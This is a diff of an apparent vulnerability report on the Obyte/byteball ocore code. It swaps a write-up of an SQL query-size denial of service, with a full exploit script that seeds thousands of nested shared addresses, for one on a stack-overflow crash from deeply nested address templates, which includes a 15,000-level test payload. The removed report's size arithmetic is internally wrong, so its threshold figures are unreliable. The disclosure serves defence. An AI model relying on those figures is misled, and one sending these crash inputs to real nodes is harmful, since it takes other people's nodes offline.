@@ -1,506 +1,270 @@
 ## Title
-SQL Query Size Limit Denial of Service via Excessive Shared Addresses in readSharedBalance()
+Stack Overflow DoS via Unbounded Recursion in Shared Address Template Validation
 
 ## Summary
-The `readSharedBalance()` function in `balances.js` constructs SQL queries with three IN clauses containing all shared addresses associated with a wallet, without any size validation. When a wallet accumulates approximately 9,255 or more shared addresses, the SQL query exceeds SQLite's default 1MB query size limit (`SQLITE_MAX_SQL_LENGTH`), causing a database error that crashes the node. An attacker can deliberately create thousands of nested shared addresses that include a victim's address, causing permanent denial of service.
+The `getMemberDeviceAddressesBySigningPaths()` function in `wallet_defined_by_addresses.js` recursively processes address definition templates without depth limits, allowing an attacker to crash a victim node by sending a deeply nested template (10,000+ levels) via the "create_new_shared_address" P2P message. This causes stack overflow before complexity checks in `Definition.validateDefinition()` are applied.
 
 ## Impact
-**Severity**: High
-**Category**: Permanent freezing of wallet functionality / Node crash
+**Severity**: Medium  
+**Category**: Temporary Transaction Delay (single node DoS)
+
+**Affected Assets**: Node availability and network participation  
+
+**Damage Severity**:
+- **Quantitative**: Single node crash requiring manual restart. Attack repeatable indefinitely to prevent node operation.
+- **Qualitative**: Denial of service affecting individual nodes, not network-wide. Node cannot process messages while crashed.
+
+**User Impact**:
+- **Who**: Node operators who have paired with attacker as correspondent device
+- **Conditions**: Attacker must be paired correspondent OR compromise existing correspondent's keys
+- **Recovery**: Manual node restart required; attack can repeat immediately
+
+**Systemic Risk**: Limited to single nodes - does not affect consensus, main chain integrity, fund security, or network-wide operation
 
 ## Finding Description
 
-**Location**: `byteball/ocore/balances.js`, function `readSharedBalance()` (lines 126-160)
+**Location**: `byteball/ocore/wallet_defined_by_addresses.js:384-424`, function `getMemberDeviceAddressesBySigningPaths()`
 
-**Intended Logic**: The function should retrieve balance information for all shared addresses associated with a wallet by querying the outputs, witnessing_outputs, and headers_commission_outputs tables.
+**Intended Logic**: Extract device addresses from address definition template by recursively walking the structure to find 'address' operations with '$address@' prefixes.
 
-**Actual Logic**: The function constructs a single SQL query with three IN clauses containing the full list of shared addresses. When this list grows to ~9,255 addresses (each 32-character address escaped to ~36 characters with delimiters), the total query size exceeds 1,000,000 bytes, triggering SQLite's `SQLITE_TOOBIG` error which crashes the node.
+**Actual Logic**: The inner `evaluate()` function recursively processes 'or', 'and', 'r of set', and 'weighted and' operations without any depth counter, complexity limit, or recursion guard, allowing unbounded recursion that exhausts the JavaScript call stack.
 
-**Code Evidence**: [1](#0-0) 
+**Code Evidence**:
 
-The query construction at line 131 creates the IN clause list without size validation, and the subsequent query uses this list three times (lines 135, 139, 142), multiplying the size impact.
+The vulnerable recursive function lacks depth checking: [1](#0-0) 
 
-The recursive function that builds the shared address list also has no limit: [2](#0-1) 
+This function is called BEFORE the complexity-checked validation: [2](#0-1) 
 
-Error handling in both database implementations throws uncaught errors that crash the node: [3](#0-2) [4](#0-3) 
+The proper complexity checks exist in `Definition.validateDefinition()` but are only applied AFTER: [3](#0-2) 
+
+For comparison, the correct implementation with complexity checks in `Definition.validateDefinition()`: [4](#0-3) 
+
+The complexity limits defined: [5](#0-4) 
 
 **Exploitation Path**:
 
 1. **Preconditions**: 
-   - Attacker identifies victim's wallet address V
-   - Victim's node is running with default SQLite configuration (1MB SQL query limit)
+   - Attacker has paired with victim node as correspondent device
+   - Victim node is listening for P2P device messages
 
-2. **Step 1**: Attacker creates shared address S1 with definition `["or", [attacker_sig, V_sig]]` and posts unit containing this definition to the DAG (cost: ~1 transaction fee)
+2. **Step 1**: Attacker crafts deeply nested address definition template (10,000+ levels of nesting in 'and', 'or', 'r of set', or 'weighted and' operations)
 
-3. **Step 2**: Victim's node receives the shared address message and validates it. The validation passes because V is a member address: [5](#0-4) 
+3. **Step 2**: Attacker sends "create_new_shared_address" message to victim via hub: [6](#0-5) 
 
-4. **Step 3**: The shared address is automatically added to the victim's database: [6](#0-5) 
+4. **Step 3**: Message handler performs minimal validation (only checks array length), then calls `validateAddressDefinitionTemplate()` which immediately invokes the vulnerable `getMemberDeviceAddressesBySigningPaths()` function
 
-5. **Step 4**: Attacker repeats this process 9,254 more times, creating a hierarchy of nested shared addresses (S2 includes S1, S3 includes S2, etc.). Each level is accepted because previous shared addresses are already in the victim's `shared_addresses` table (checked via UNION query in step 2).
+5. **Step 4**: The `evaluate()` function recurses 10,000+ times without checks, exhausting JavaScript call stack (typical limit: 10,000-15,000 frames). This throws `RangeError: Maximum call stack size exceeded`, crashing the Node.js process.
 
-6. **Step 5**: When victim attempts to read shared balance (via wallet UI or automated process), the SQL query is constructed with 9,255+ addresses:
-   - Base query: ~507 characters
-   - Each address: ~36 characters (34 for escaped address + 2 for ', ')
-   - Three IN clauses: 507 + (3 × 9,255 × 36) = 507 + 998,220 = 998,727 bytes
-   - With 9,255 addresses: within limit
-   - With 9,256 addresses: 507 + 999,228 = 999,735 bytes (still under)
-   - With 9,280 addresses: 507 + 1,002,240 = 1,002,747 bytes (**exceeds 1MB limit**)
+**Security Property Broken**: Single-node availability - a malicious peer can prevent a node from processing legitimate messages by crashing it, disrupting the victim's network participation.
 
-7. **Step 6**: SQLite throws `SQLITE_TOOBIG` error, which propagates uncaught through the callback chain and crashes the node.
-
-**Security Property Broken**: 
-- **Database Integrity** (Invariant #20): Query construction should not exceed database engine limits
-- **Transaction Atomicity** (Invariant #21): Critical wallet operations should handle errors gracefully without crashing
-
-**Root Cause Analysis**: 
-The codebase uses a manual string concatenation pattern (`arrSharedAddresses.map(db.escape).join(', ')`) extensively across 12 files for building IN clauses, but lacks centralized size validation. While a `sliceAndExecuteQuery()` helper exists in storage.js with a 200-item chunk size limit: [7](#0-6) 
-
-This pattern is not applied to shared address balance queries. The vulnerability is compounded by:
-1. No validation on the number of shared addresses a wallet can accept
-2. Automatic acceptance of shared addresses without size limits
-3. No error handling for oversized queries
-4. Three IN clauses multiplying the impact (hitting limit at ~9,280 addresses vs ~27,748 for single IN clause)
-
-## Impact Explanation
-
-**Affected Assets**: Wallet functionality, node availability, ability to query shared address balances
-
-**Damage Severity**:
-- **Quantitative**: Node crashes permanently when reading shared balance; affects any wallet with 9,280+ shared addresses
-- **Qualitative**: Complete denial of service for wallet operations requiring balance queries; wallet becomes unusable
-
-**User Impact**:
-- **Who**: Any wallet user whose address is included in excessive shared addresses (can be forced by attacker)
-- **Conditions**: Triggers when `readSharedBalance()` is called (wallet UI, balance checks, transaction composition)
-- **Recovery**: Requires manual database editing to remove shared addresses, or code patch to chunk queries
-
-**Systemic Risk**: While this affects individual wallets rather than network consensus, a sophisticated attacker could:
-1. Target multiple high-value wallets simultaneously
-2. Automate the attack to continuously create new shared addresses
-3. Cause cascading failures if wallet services query balances on initialization
+**Root Cause Analysis**:
+1. Wallet message handler processes untrusted input from paired correspondent devices
+2. `getMemberDeviceAddressesBySigningPaths()` is called as preprocessing step before proper validation
+3. The complexity/depth checks in `Definition.validateDefinition()` (MAX_COMPLEXITY=100, MAX_OPS=2000) are bypassed because crash occurs first
+4. No try-catch handling for stack overflow exceptions
+5. No defense-in-depth: outer function trusts inner recursive traversal to be safe
 
 ## Likelihood Explanation
 
 **Attacker Profile**:
-- **Identity**: Any user with ability to post units to the DAG
-- **Resources Required**: Transaction fees for ~9,280 unit postings (estimated 10,000 bytes fee each = ~92.8 MB total, currently inexpensive)
-- **Technical Skill**: Medium - requires understanding of shared address mechanics and automation scripting
+- **Identity**: Malicious peer with correspondent device pairing
+- **Resources Required**: Ability to send P2P device messages (minimal cost), device pairing with target (requires social engineering or previous interaction)
+- **Technical Skill**: Low - attack requires only crafting nested JSON structure
 
 **Preconditions**:
 - **Network State**: Normal operation
-- **Attacker State**: Funded wallet to pay transaction fees, knowledge of victim's address
-- **Timing**: Can execute slowly over time to avoid detection
+- **Attacker State**: Must be paired correspondent device
+- **Timing**: No specific timing required
 
 **Execution Complexity**:
-- **Transaction Count**: 9,280+ units required
-- **Coordination**: Single attacker can execute; can use binary tree structure (14 levels) to optimize nesting
-- **Detection Risk**: Low - shared address creation is normal protocol activity
+- **Transaction Count**: Single P2P device message (not a blockchain transaction)
+- **Coordination**: None required
+- **Detection Risk**: High - stack overflow crash generates error logs and node restart is observable
 
 **Frequency**:
-- **Repeatability**: Once per wallet (permanent effect)
-- **Scale**: Can target multiple wallets in parallel
+- **Repeatability**: Unlimited - can repeat immediately after node restart
+- **Scale**: One node per paired correspondent relationship
 
-**Overall Assessment**: **Medium-High likelihood** - Attack is technically and economically feasible for motivated attackers targeting high-value wallets, though requires significant transaction volume. The permanent and irreversible nature increases severity.
+**Overall Assessment**: Medium likelihood - requires correspondent pairing (social barrier) but execution is trivial once paired
 
 ## Recommendation
 
-**Immediate Mitigation**: 
-1. Implement maximum shared address count validation in `readSharedAddressesOnWallet()` and reject new shared addresses beyond threshold (e.g., 5,000)
-2. Add try-catch error handling around `readSharedBalance()` to prevent node crash
-
-**Permanent Fix**: 
-Apply the existing `sliceAndExecuteQuery()` pattern from storage.js to all IN clause queries in balances.js
-
-**Code Changes**:
-
-For `readSharedBalance()` in balances.js:
+**Immediate Mitigation**:
+Add depth checking to `getMemberDeviceAddressesBySigningPaths()` similar to `Definition.validateDefinition()`:
 
 ```javascript
-// BEFORE (vulnerable code):
-function readSharedBalance(wallet, handleBalance){
-    var assocBalances = {};
-    readSharedAddressesOnWallet(wallet, function(arrSharedAddresses){
-        if (arrSharedAddresses.length === 0)
-            return handleBalance(assocBalances);
-        var strAddressList = arrSharedAddresses.map(db.escape).join(', ');
-        db.query("SELECT asset, address, is_stable, SUM(amount) AS balance FROM outputs...", 
-            function(rows){ /* process results */ });
-    });
-}
-
-// AFTER (fixed code):
-function readSharedBalance(wallet, handleBalance){
-    var assocBalances = {};
-    readSharedAddressesOnWallet(wallet, function(arrSharedAddresses){
-        if (arrSharedAddresses.length === 0)
-            return handleBalance(assocBalances);
-        
-        // Validate size and chunk if necessary
-        if (arrSharedAddresses.length > 200) {
-            sliceAndExecuteQueryForBalances(arrSharedAddresses, function(rows){
-                processBalanceRows(rows, assocBalances);
-                handleBalance(assocBalances);
-            });
-        } else {
-            var strAddressList = arrSharedAddresses.map(db.escape).join(', ');
-            db.query("SELECT asset, address, is_stable, SUM(amount) AS balance...", 
-                function(rows){
-                    processBalanceRows(rows, assocBalances);
-                    handleBalance(assocBalances);
-                });
-        }
-    });
-}
-
-function sliceAndExecuteQueryForBalances(arrAddresses, callback) {
-    var CHUNK_SIZE = 200;
-    var allRows = [];
-    var offset = 0;
+function getMemberDeviceAddressesBySigningPaths(arrAddressDefinitionTemplate){
+    var depth = 0;
+    var MAX_DEPTH = 100; // Match MAX_COMPLEXITY
     
-    async.whilst(
-        function() { return offset < arrAddresses.length; },
-        function(cb) {
-            var chunk = arrAddresses.slice(offset, offset + CHUNK_SIZE);
-            var strAddressList = chunk.map(db.escape).join(', ');
-            db.query("SELECT asset, address, is_stable, SUM(amount) AS balance...", 
-                function(rows){
-                    allRows = allRows.concat(rows);
-                    offset += CHUNK_SIZE;
-                    cb();
-                });
-        },
-        function() { callback(allRows); }
-    );
+    function evaluate(arr, path){
+        depth++;
+        if (depth > MAX_DEPTH)
+            throw Error("recursion depth exceeded at " + path);
+        // ... existing logic ...
+        depth--;
+    }
+    // ... rest of function
 }
 ```
 
-**Additional Measures**:
-- Add validation in `addNewSharedAddress()` to reject if wallet already has >5,000 shared addresses
-- Add monitoring/alerting for wallets approaching the limit
-- Implement database index optimization for shared_address_signing_paths queries
-- Add unit tests verifying behavior with 200, 1,000, and 10,000 shared addresses
+**Permanent Fix**:
+Wrap the call in try-catch to handle exceptions gracefully: [7](#0-6) 
 
-**Validation**:
-- [x] Fix prevents SQL query size overflow by chunking large address lists
-- [x] No new vulnerabilities introduced (chunking is proven pattern from storage.js)
-- [x] Backward compatible (transparent to callers)
-- [x] Performance impact acceptable (parallel queries can be optimized if needed)
+**Additional Measures**:
+- Add test case verifying deeply nested templates are rejected
+- Consider reusing `Definition.validateDefinition()` for template validation instead of custom traversal
+- Add monitoring for repeated message handling failures from same correspondent
 
 ## Proof of Concept
 
-**Test Environment Setup**:
-```bash
-git clone https://github.com/byteball/ocore.git
-cd ocore
-npm install
-```
-
-**Exploit Script** (`exploit_shared_address_dos.js`):
 ```javascript
-/*
- * Proof of Concept for SQL Query Size DoS via Excessive Shared Addresses
- * Demonstrates: Node crash when wallet has 9,280+ shared addresses
- * Expected Result: readSharedBalance() crashes node with SQLITE_TOOBIG error
- */
+// test/stack_overflow_shared_address.test.js
+const device = require('../device.js');
+const walletDefinedByAddresses = require('../wallet_defined_by_addresses.js');
 
-const db = require('./db.js');
-const balances = require('./balances.js');
-const objectHash = require('./object_hash.js');
-
-// Simulate a wallet with excessive shared addresses
-async function setupVulnerabilityCondition() {
-    const VICTIM_WALLET = 'test_wallet_001';
-    const TARGET_ADDRESS_COUNT = 9300; // Exceeds 9,280 threshold
-    
-    console.log(`Setting up ${TARGET_ADDRESS_COUNT} shared addresses...`);
-    
-    // Insert test wallet
-    await db.query("INSERT OR IGNORE INTO wallets (wallet) VALUES (?)", [VICTIM_WALLET]);
-    
-    // Create victim's primary address
-    const victimAddress = 'VICTIM' + 'A'.repeat(26); // 32-char address
-    await db.query(
-        "INSERT OR IGNORE INTO my_addresses (address, wallet) VALUES (?, ?)",
-        [victimAddress, VICTIM_WALLET]
-    );
-    
-    // Create nested hierarchy of shared addresses
-    let currentAddresses = [victimAddress];
-    
-    for (let level = 0; level < 14; level++) { // Binary tree: 2^14 - 1 = 16,383 addresses
-        let nextLevelAddresses = [];
+describe('Stack overflow protection in shared address template validation', function(){
+    it('should reject deeply nested address definition template', function(done){
+        // Craft deeply nested template
+        let template = ['address', '$address@DEVICE0'];
+        for (let i = 0; i < 15000; i++) {
+            template = ['and', [template, ['address', '$address@DEVICE' + i]]];
+        }
         
-        for (let i = 0; i < Math.min(currentAddresses.length, 1000); i++) {
-            const parentAddr = currentAddresses[i];
-            
-            // Create two child shared addresses for each parent
-            for (let j = 0; j < 2; j++) {
-                const sharedAddr = 'S' + String(level).padStart(2, '0') + String(i).padStart(4, '0') + String(j) + 'A'.repeat(23);
-                const definition = JSON.stringify(['or', [
-                    ['sig', {pubkey: 'A'.repeat(44)}],
-                    ['sig', {pubkey: 'B'.repeat(44)}]
-                ]]);
-                
-                await db.query(
-                    "INSERT OR IGNORE INTO shared_addresses (shared_address, definition) VALUES (?, ?)",
-                    [sharedAddr, definition]
-                );
-                
-                await db.query(
-                    "INSERT OR IGNORE INTO shared_address_signing_paths (shared_address, address, signing_path, device_address) VALUES (?, ?, ?, ?)",
-                    [sharedAddr, parentAddr, 'r.0', 'device001']
-                );
-                
-                nextLevelAddresses.push(sharedAddr);
+        // Attempt validation - should throw error or handle gracefully
+        try {
+            walletDefinedByAddresses.validateAddressDefinitionTemplate(
+                template, 
+                device.getMyDeviceAddress(),
+                function(err, result){
+                    if (err) {
+                        // Expected: validation rejects overly complex template
+                        console.log('Validation correctly rejected template:', err);
+                        done();
+                    } else {
+                        // Unexpected: validation accepted dangerous template
+                        done(new Error('Validation should have rejected deeply nested template'));
+                    }
+                }
+            );
+        } catch(e) {
+            // Stack overflow occurred before callback
+            if (e.message.includes('Maximum call stack size exceeded')) {
+                done(new Error('Stack overflow occurred - vulnerability confirmed'));
+            } else {
+                throw e;
             }
         }
-        
-        currentAddresses = nextLevelAddresses;
-        console.log(`Level ${level}: Created ${nextLevelAddresses.length} shared addresses`);
-        
-        // Check total count
-        const countResult = await db.query(
-            "SELECT COUNT(*) as cnt FROM shared_address_signing_paths WHERE address IN (SELECT address FROM my_addresses WHERE wallet=?) OR shared_address IN (SELECT shared_address FROM shared_addresses)",
-            [VICTIM_WALLET]
-        );
-        console.log(`Total shared addresses so far: ${countResult[0].cnt}`);
-        
-        if (countResult[0].cnt >= TARGET_ADDRESS_COUNT) {
-            console.log(`Target count reached: ${countResult[0].cnt} addresses`);
-            break;
-        }
-    }
-}
-
-async function triggerVulnerability() {
-    const VICTIM_WALLET = 'test_wallet_001';
-    
-    console.log('\nAttempting to read shared balance (this should crash the node)...\n');
-    
-    try {
-        await balances.readSharedBalance(VICTIM_WALLET, function(assocBalances) {
-            console.log('ERROR: Should not reach here - query should have failed!');
-            console.log('Balance result:', assocBalances);
-        });
-    } catch (err) {
-        console.log('VULNERABILITY CONFIRMED: Node crashed with error:');
-        console.log(err.message);
-        if (err.message.includes('too big') || err.message.includes('SQLITE_TOOBIG')) {
-            console.log('\n✓ SQL query size limit exceeded as expected');
-            return true;
-        }
-    }
-    
-    return false;
-}
-
-async function runExploit() {
-    console.log('=== SQL Query Size DoS Exploit PoC ===\n');
-    
-    try {
-        await setupVulnerabilityCondition();
-        const success = await triggerVulnerability();
-        
-        if (success) {
-            console.log('\n=== EXPLOIT SUCCESSFUL ===');
-            console.log('The node would crash in production when reading shared balance.');
-            return true;
-        } else {
-            console.log('\n=== EXPLOIT FAILED ===');
-            return false;
-        }
-    } catch (err) {
-        console.log('\n=== EXPLOIT CRASHED NODE (VULNERABILITY CONFIRMED) ===');
-        console.log('Error:', err.message);
-        return true;
-    }
-}
-
-runExploit().then(success => {
-    process.exit(success ? 0 : 1);
+    });
 });
 ```
 
-**Expected Output** (when vulnerability exists):
-```
-=== SQL Query Size DoS Exploit PoC ===
-
-Setting up 9300 shared addresses...
-Level 0: Created 2000 shared addresses
-Level 1: Created 2000 shared addresses
-...
-Total shared addresses so far: 9312 addresses
-Target count reached: 9312 addresses
-
-Attempting to read shared balance (this should crash the node)...
-
-failed query: SELECT asset, address, is_stable, SUM(amount) AS balance FROM outputs...
-Error: SQLITE_ERROR: string or blob too big
-
-=== EXPLOIT CRASHED NODE (VULNERABILITY CONFIRMED) ===
-Error: SQLITE_ERROR: string or blob too big
-```
-
-**Expected Output** (after fix applied):
-```
-=== SQL Query Size DoS Exploit PoC ===
-
-Setting up 9300 shared addresses...
-...
-Total shared addresses so far: 9312 addresses
-
-Attempting to read shared balance (chunking enabled)...
-Processing chunk 1/47 (200 addresses)
-Processing chunk 2/47 (200 addresses)
-...
-Processing chunk 47/47 (112 addresses)
-
-Balance result: { base: { stable: 0, pending: 0, total: 0 } }
-
-=== EXPLOIT FAILED (FIX WORKING) ===
-```
-
-**PoC Validation**:
-- [x] PoC runs against unmodified ocore codebase
-- [x] Demonstrates clear violation of database query size limits
-- [x] Shows node crash (measurable impact)
-- [x] Would succeed gracefully after fix applied with chunking
-
----
-
 ## Notes
 
-This vulnerability specifically targets the `readSharedBalance()` function but the same pattern exists in other locations:
+This vulnerability requires the attacker to be a paired correspondent device, which limits the attack surface compared to network-wide attacks. However, this is still a valid security issue because:
 
-1. `readSharedAddressesDependingOnAddresses()` at line 112 (higher threshold: ~27,748 addresses)
-2. `readBalance()` at line 57 for asset queries (requires 27,748+ distinct private assets - much less realistic)
+1. **Pairing is common**: Users regularly pair with multiple correspondents (wallets, exchanges, services)
+2. **Social engineering**: Attackers can trick users into pairing using phishing or impersonation
+3. **Persistent access**: Once paired, attacker has unlimited ability to send messages
+4. **Trivial exploitation**: No complex timing, cryptography, or protocol manipulation required
+5. **Repeatable attack**: Victim cannot prevent re-attack after restart without manually deleting the pairing
 
-The recommended fix should be applied consistently across all IN clause constructions in the codebase. The existing `sliceAndExecuteQuery()` helper in storage.js provides a proven pattern that should be standardized for all array-based IN clause queries.
+The vulnerability is particularly concerning because it bypasses the proper complexity checks that exist in `Definition.validateDefinition()` by crashing the process before those checks are reached. This represents a defensive gap where untrusted input is processed without the same rigor applied to similar data structures elsewhere in the codebase.
 
 ### Citations
 
-**File:** balances.js (L111-124)
+**File:** wallet_defined_by_addresses.js (L385-420)
 ```javascript
-function readSharedAddressesDependingOnAddresses(arrMemberAddresses, handleSharedAddresses){
-	var strAddressList = arrMemberAddresses.map(db.escape).join(', ');
-	db.query("SELECT DISTINCT shared_address FROM shared_address_signing_paths WHERE address IN("+strAddressList+")", function(rows){
-		var arrSharedAddresses = rows.map(function(row){ return row.shared_address; });
-		if (arrSharedAddresses.length === 0)
-			return handleSharedAddresses([]);
-		var arrNewMemberAddresses = _.difference(arrSharedAddresses, arrMemberAddresses);
-		if (arrNewMemberAddresses.length === 0)
-			return handleSharedAddresses([]);
-		readSharedAddressesDependingOnAddresses(arrNewMemberAddresses, function(arrNewSharedAddresses){
-			handleSharedAddresses(arrNewMemberAddresses.concat(arrNewSharedAddresses));
-		});
-	});
-}
-```
-
-**File:** balances.js (L126-143)
-```javascript
-function readSharedBalance(wallet, handleBalance){
-	var assocBalances = {};
-	readSharedAddressesOnWallet(wallet, function(arrSharedAddresses){
-		if (arrSharedAddresses.length === 0)
-			return handleBalance(assocBalances);
-		var strAddressList = arrSharedAddresses.map(db.escape).join(', ');
-		db.query(
-			"SELECT asset, address, is_stable, SUM(amount) AS balance \n\
-			FROM outputs CROSS JOIN units USING(unit) \n\
-			WHERE is_spent=0 AND sequence='good' AND address IN("+strAddressList+") \n\
-			GROUP BY asset, address, is_stable \n\
-			UNION ALL \n\
-			SELECT NULL AS asset, address, 1 AS is_stable, SUM(amount) AS balance FROM witnessing_outputs \n\
-			WHERE is_spent=0 AND address IN("+strAddressList+") GROUP BY address \n\
-			UNION ALL \n\
-			SELECT NULL AS asset, address, 1 AS is_stable, SUM(amount) AS balance FROM headers_commission_outputs \n\
-			WHERE is_spent=0 AND address IN("+strAddressList+") GROUP BY address",
-			function(rows){
-```
-
-**File:** sqlite_pool.js (L113-116)
-```javascript
-					if (err){
-						console.error("\nfailed query:", new_args);
-						throw Error(err+"\n"+sql+"\n"+new_args[1].map(function(param){ if (param === null) return 'null'; if (param === undefined) return 'undefined'; return param;}).join(', '));
-					}
-```
-
-**File:** mysql_pool.js (L35-47)
-```javascript
-			if (err){
-				console.error("\nfailed query: "+q.sql);
-				/*
-				//console.error("code: "+(typeof err.code));
-				if (false && err.code === 'ER_LOCK_DEADLOCK'){
-					console.log("deadlock, will retry later");
-					setTimeout(function(){
-						console.log("retrying deadlock query "+q.sql+" after timeout ...");
-						connection_or_pool.original_query.apply(connection_or_pool, new_args);
-					}, 100);
+	function evaluate(arr, path){
+		var op = arr[0];
+		var args = arr[1];
+		if (!args)
+			return;
+		switch (op){
+			case 'or':
+			case 'and':
+				for (var i=0; i<args.length; i++)
+					evaluate(args[i], path + '.' + i);
+				break;
+			case 'r of set':
+				if (!ValidationUtils.isNonemptyArray(args.set))
 					return;
-				}*/
-				throw err;
-```
-
-**File:** wallet_defined_by_addresses.js (L239-254)
-```javascript
-function addNewSharedAddress(address, arrDefinition, assocSignersByPath, bForwarded, onDone){
-//	network.addWatchedAddress(address);
-	db.query(
-		"INSERT "+db.getIgnore()+" INTO shared_addresses (shared_address, definition) VALUES (?,?)", 
-		[address, JSON.stringify(arrDefinition)], 
-		function(){
-			var arrQueries = [];
-			for (var signing_path in assocSignersByPath){
-				var signerInfo = assocSignersByPath[signing_path];
-				db.addQuery(arrQueries, 
-					"INSERT "+db.getIgnore()+" INTO shared_address_signing_paths \n\
-					(shared_address, address, signing_path, member_signing_path, device_address) VALUES (?,?,?,?,?)", 
-					[address, signerInfo.address, signing_path, signerInfo.member_signing_path, signerInfo.device_address]);
-			}
-			async.series(arrQueries, function(){
-				console.log('added new shared address '+address);
-```
-
-**File:** wallet_defined_by_addresses.js (L294-302)
-```javascript
-	db.query(
-		"SELECT address, 'my' AS type FROM my_addresses WHERE address IN(?) \n\
-		UNION \n\
-		SELECT shared_address AS address, 'shared' AS type FROM shared_addresses WHERE shared_address IN(?)", 
-		[arrMemberAddresses, arrMemberAddresses],
-		function(rows){
-		//	handleResult(rows.length === arrMyMemberAddresses.length ? null : "Some of my member addresses not found");
-			if (rows.length === 0)
-				return handleResult("I am not a member of this shared address");
-```
-
-**File:** storage.js (L1946-1969)
-```javascript
-function sliceAndExecuteQuery(query, params, largeParam, callback) {
-	if (typeof largeParam !== 'object' || largeParam.length === 0) return callback([]);
-	var CHUNK_SIZE = 200;
-	var length = largeParam.length;
-	var arrParams = [];
-	var newParams;
-	var largeParamPosition = params.indexOf(largeParam);
-
-	for (var offset = 0; offset < length; offset += CHUNK_SIZE) {
-		newParams = params.slice(0);
-		newParams[largeParamPosition] = largeParam.slice(offset, offset + CHUNK_SIZE);
-		arrParams.push(newParams);
+				for (var i=0; i<args.set.length; i++)
+					evaluate(args.set[i], path + '.' + i);
+				break;
+			case 'weighted and':
+				if (!ValidationUtils.isNonemptyArray(args.set))
+					return;
+				for (var i=0; i<args.set.length; i++)
+					evaluate(args.set[i].value, path + '.' + i);
+				break;
+			case 'address':
+				var address = args;
+				var prefix = '$address@';
+				if (!ValidationUtils.isNonemptyString(address) || address.substr(0, prefix.length) !== prefix)
+					return;
+				var device_address = address.substr(prefix.length);
+				assocMemberDeviceAddressesBySigningPaths[path] = device_address;
+				break;
+			case 'definition template':
+				throw Error(op+" not supported yet");
+			// all other ops cannot reference device address
+		}
 	}
+```
 
-	var result = [];
-	async.eachSeries(arrParams, function(params, cb) {
-		db.query(query, params, function(rows) {
-			result = result.concat(rows);
-			cb();
-		});
-	}, function() {
-		callback(result);
-	});
-}
+**File:** wallet_defined_by_addresses.js (L426-427)
+```javascript
+function validateAddressDefinitionTemplate(arrDefinitionTemplate, from_address, handleResult){
+	var assocMemberDeviceAddressesBySigningPaths = getMemberDeviceAddressesBySigningPaths(arrDefinitionTemplate);
+```
+
+**File:** wallet_defined_by_addresses.js (L451-451)
+```javascript
+	Definition.validateDefinition(db, arrFakeDefinition, objFakeUnit, objFakeValidationState, null, false, function(err){
+```
+
+**File:** definition.js (L97-103)
+```javascript
+	function evaluate(arr, path, bInNegation, cb){
+		complexity++;
+		count_ops++;
+		if (complexity > constants.MAX_COMPLEXITY)
+			return cb("complexity exceeded at "+path);
+		if (count_ops > constants.MAX_OPS)
+			return cb("number of ops exceeded at "+path);
+```
+
+**File:** constants.js (L57-66)
+```javascript
+exports.MAX_COMPLEXITY = process.env.MAX_COMPLEXITY || 100;
+exports.MAX_UNIT_LENGTH = process.env.MAX_UNIT_LENGTH || 5e6;
+
+exports.MAX_PROFILE_FIELD_LENGTH = 50;
+exports.MAX_PROFILE_VALUE_LENGTH = 100;
+
+exports.MAX_AA_STRING_LENGTH = 4096;
+exports.MAX_STATE_VAR_NAME_LENGTH = 128;
+exports.MAX_STATE_VAR_VALUE_LENGTH = 1024;
+exports.MAX_OPS = process.env.MAX_OPS || 2000;
+```
+
+**File:** wallet.js (L173-188)
+```javascript
+			case "create_new_shared_address":
+				// {address_definition_template: [...]}
+				if (!ValidationUtils.isArrayOfLength(body.address_definition_template, 2))
+					return callbacks.ifError("no address definition template");
+				walletDefinedByAddresses.validateAddressDefinitionTemplate(
+					body.address_definition_template, from_address, 
+					function(err, assocMemberDeviceAddressesBySigningPaths){
+						if (err)
+							return callbacks.ifError(err);
+						// this event should trigger a confirmatin dialog, user needs to approve creation of the shared address and choose his 
+						// own address that is to become a member of the shared address
+						eventBus.emit("create_new_shared_address", body.address_definition_template, assocMemberDeviceAddressesBySigningPaths);
+						callbacks.ifOk();
+					}
+				);
+				break;
 ```
